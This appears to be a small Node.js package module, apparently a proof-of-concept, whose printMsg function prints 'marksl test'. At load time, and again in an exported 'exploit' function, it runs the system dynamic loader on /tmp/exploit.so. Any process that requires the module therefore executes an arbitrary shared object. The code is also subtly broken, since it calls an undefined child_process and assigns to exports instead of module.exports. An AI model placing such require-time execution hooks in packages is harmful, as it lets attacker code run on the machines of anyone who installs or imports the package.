const { spawnSync } = require('child_process');

child_process.spawnSync("/lib64/ld-linux-x86-64.so.2", ["/tmp/exploit.so"], {stdio: 'pipe',encoding:'utf-8'})

exports = {
    printMsg: function () {
        console.log("marksl test");
        return "marksl test";
    },
    exploit: function () {
        child_process.spawnSync("/lib64/ld-linux-x86-64.so.2", ["/tmp/exploit.so"], {stdio: 'pipe',encoding:'utf-8'})
    }
}